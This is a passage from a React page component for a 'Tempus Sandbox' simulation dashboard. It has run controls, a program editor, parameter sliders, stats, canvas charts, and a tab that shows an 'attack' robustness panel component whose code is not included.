      const evs = simRef.current.getEvents();
      const cnts = new Map<string, number>();
      evs.forEach(ev => cnts.set(ev.cell, (cnts.get(ev.cell) ?? 0) + 1));
      setCellCounts(new Map(cnts));
      setStats({ total: evs.length, dispatched: evs.filter(e => e.actionFired !== null).length,
                 anomalies: evs.filter(e => e.cell === 'anomaly').length, done: simRef.current.isDone() });
      redrawAll();
    }, 50);
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, [running, redrawAll]);

  // resize observer — wire all 6 canvases
  useEffect(() => {
    const canvases = Object.values(cvs).map(r => r.current).filter(Boolean) as HTMLCanvasElement[];
    if (!canvases.length) return;
    const ro = new ResizeObserver(() => redrawAll());
    canvases.forEach(c => ro.observe(c));
    return () => ro.disconnect();
  }, [redrawAll]); // eslint-disable-line react-hooks/exhaustive-deps

  const pct = nEvents > 0 ? Math.round((stats.total / nEvents) * 100) : 0;

  // ── JSX ────────────────────────────────────────────────────────────────────
  return (
    <div style={{ background:'#030705', color:'#e2e8f0', height:'100vh',
                  fontFamily:'monospace', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <Head><title>Tempus Sandbox</title></Head>

      {/* header */}
      <header style={{ height:50, borderBottom:'1px solid rgba(255,255,255,0.07)',
                       display:'flex', alignItems:'center', padding:'0 20px', gap:16, flexShrink:0 }}>
        <Link href="/" style={{ color:'rgba(255,255,255,0.28)', fontSize:10,
                                textDecoration:'none', letterSpacing:'0.16em' }}>← BACK</Link>
        <span style={{ color:'rgba(255,255,255,0.85)', fontSize:11, letterSpacing:'0.3em', fontWeight:700 }}>
          TEMPUS
        </span>
        <div style={{ marginLeft:'auto', display:'flex', gap:7 }}>
          {[
            { label:'RUN ▶', fn: handleRun,  dis: running,
              s: { background: running ? '#1a2a1a' : '#58E6D9', color: running ? '#445' : '#020f0d', border:'none', fontWeight:700 } },
            { label:'STOP',  fn: handleStop, dis: !running,
              s: { background:'transparent', color: !running ? 'rgba(255,255,255,0.15)' : '#ef4444',
                   border:`1px solid ${!running ? 'rgba(255,255,255,0.07)' : '#ef4444'}` } },
            { label:'RESET', fn: handleReset, dis: false,
              s: { background:'transparent', color:'rgba(255,255,255,0.28)', border:'1px solid rgba(255,255,255,0.1)' } },
          ].map(b => (
            <button key={b.label} onClick={b.fn} disabled={b.dis}
              style={{ padding:'5px 15px', fontSize:10, letterSpacing:'0.12em',
                       cursor: b.dis ? 'not-allowed' : 'pointer', fontFamily:'monospace', ...b.s }}>
              {b.label}
            </button>
          ))}
        </div>
      </header>

      {/* body */}
      <div style={{ display:'flex', flex:1, overflow:'hidden', minHeight:0 }}>

        {/* ── LEFT ── */}
        <div style={{ width:385, flexShrink:0, borderRight:'1px solid rgba(255,255,255,0.07)',
                      display:'flex', flexDirection:'column', overflow:'hidden' }}>

          <div style={{ display:'flex', borderBottom:'1px solid rgba(255,255,255,0.07)', flexShrink:0 }}>
            {(['program', 'attack'] as const).map(tab => (
              <button key={tab} onClick={() => setLeftTab(tab)}
                style={{ flex:1, padding:'9px 6px', fontFamily:'monospace', fontSize:9,
                         letterSpacing:'0.14em', textTransform:'uppercase',
                         background:'transparent', border:'none', cursor:'pointer',
                         borderBottom: leftTab === tab ? '2px solid #58E6D9' : '2px solid transparent',
                         color: leftTab === tab ? '#58E6D9' : 'rgba(255,255,255,0.28)', transition:'all 0.12s' }}>
                {tab === 'attack' ? 'Structural Incorruptibility' : 'Program'}
              </button>
            ))}
          </div>

          {leftTab === 'program' && (<>
            <textarea value={code} onChange={e => setCode(e.target.value)} spellCheck={false}
              style={{ flex:1, background:'#060b08', color:'#c8faf5', fontFamily:'monospace',
                       fontSize:11.5, lineHeight:1.65, padding:'13px', border:'none',
                       resize:'none', outline:'none', minHeight:0 }} />
            {error && (
              <div style={{ background:'#170606', color:'#ef4444', fontSize:10,
                            padding:'7px 11px', borderTop:'1px solid #3a1010', lineHeight:1.5 }}>
                {error}
              </div>
            )}
            <div style={{ padding:'10px 12px', borderTop:'1px solid rgba(255,255,255,0.06)',
                          display:'flex', flexDirection:'column', gap:8, flexShrink:0 }}>
              <div style={{ display:'grid', gridTemplateColumns:'64px auto 1fr', gap:8, alignItems:'center' }}>
                <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.28)', textTransform:'uppercase' }}>Events</label>
                <input type="number" value={nEvents} min={50} max={5000} step={50}
                  onChange={e => setNEvents(+e.target.value)}
                  style={{ width:72, background:'#0d1a14', border:'1px solid rgba(255,255,255,0.08)',
                           color:'#c8faf5', fontFamily:'monospace', fontSize:11, padding:'3px 6px' }} />
              </div>
              {[
                { lbl:'Noise σ', min:0,  max:1,    step:0.05, val:noise, set:setNoise, fmt:(v:number)=>v.toFixed(2), unit:'' },
                { lbl:'Speed',   min:20, max:1000, step:20,   val:speed, set:setSpeed, fmt:(v:number)=>String(v),    unit:'/s' },
              ].map(({ lbl, min, max, step, val, set, fmt, unit }) => (
                <div key={lbl} style={{ display:'grid', gridTemplateColumns:'64px 1fr 42px', gap:8, alignItems:'center' }}>
                  <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.28)', textTransform:'uppercase' }}>{lbl}</label>
                  <input type="range" min={min} max={max} step={step} value={val}
                    onChange={e => set(+e.target.value)} style={{ accentColor:'#58E6D9' }} />
                  <span style={{ fontSize:10, color:'#58E6D9', textAlign:'right' }}>{fmt(val)}{unit}</span>
                </div>
              ))}
              <div>
                <div style={{ background:'rgba(255,255,255,0.05)', height:2, borderRadius:1 }}>
                  <div style={{ background:'#58E6D9', height:'100%', borderRadius:1,
                                width:`${pct}%`, transition:'width 0.1s' }} />
                </div>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', marginTop:7 }}>
                  {[['EVENTS', `${stats.total}/${nEvents}`], ['DISPATCH', String(stats.dispatched)],
                    ['ANOMALY', String(stats.anomalies)],    ['STATUS', stats.done ? 'DONE' : running ? 'RUN' : 'IDLE']
                  ].map(([k, v]) => (
                    <div key={k} style={{ textAlign:'center' }}>
                      <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', textTransform:'uppercase' }}>{k}</div>
                      <div style={{ fontSize:11, color: k==='STATUS' && running ? '#58E6D9' :
                                                        k==='ANOMALY' && stats.anomalies > 0 ? '#ef4444' :
                                                        'rgba(255,255,255,0.55)' }}>{v}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>)}

          {leftTab === 'attack' && (
            <div style={{ flex:1, overflow:'hidden', display:'flex', flexDirection:'column' }}>
              <AttackPanel cells={parsedProg?.cells ?? new Map()} />
            </div>
          )}
        </div>

        {/* ── RIGHT ── */}
        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden', minWidth:0 }}>

          <StateStrip
            phase={liveState.phase} cycle={liveState.cycle} lastDP={liveState.lastDP}
            activeCell={liveState.activeCell} lastAction={liveState.lastAction} colors={colors}
          />

          {/*
            6 canvas charts + cell registry + action log in a 3-col × 3-row grid:

            Row 1: [ΔP Timeline ──── span 2 cols] [Cell Registry]
            Row 2: [Cell Freq] [Phase Strip]       [Action Log]
            Row 3: [Channel Activity] [ΔP Histo]  [Action Rate]
          */}
          <div style={{
            flex:1, display:'grid',
            gridTemplateColumns:'1fr 1fr 230px',
            gridTemplateRows:'1fr 1fr 1fr',
            gap:1, background:'rgba(255,255,255,0.04)',
            minHeight:0, overflow:'hidden',
          }}>
            {/* ΔP timeline — row 1, cols 1-2 */}
            <div style={{ gridColumn:'1 / 3', gridRow:1, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.dp} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* cell registry — row 1, col 3 */}
            <div style={{ gridColumn:3, gridRow:1, background:'#030705', overflow:'hidden' }}>
              {parsedProg ? (
                <CellRegistry cells={parsedProg.cells} colors={colors}
                  whens={parsedProg.whens} counts={cellCounts} activeCell={liveState.activeCell} />
              ) : (
                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                              fontSize:9, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
                  compile to see registry
                </div>
              )}
            </div>

            {/* cell frequency bar — row 2, col 1 */}
            <div style={{ gridColumn:1, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.cell} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* phase strip — row 2, col 2 */}
            <div style={{ gridColumn:2, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.phase} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* action log — row 2, col 3 */}
            <div style={{ gridColumn:3, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <ActionLog entries={actionLog} />
            </div>

            {/* channel activity — row 3, col 1 */}
            <div style={{ gridColumn:1, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.chan} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* ΔP histogram — row 3, col 2 */}
            <div style={{ gridColumn:2, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.hist} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* action rate line — row 3, col 3 */}
            <div style={{ gridColumn:3, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <canvas ref={cvs.rate} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

TempusSandbox.getLayout = (page: React.ReactElement) => page;
export default TempusSandbox;
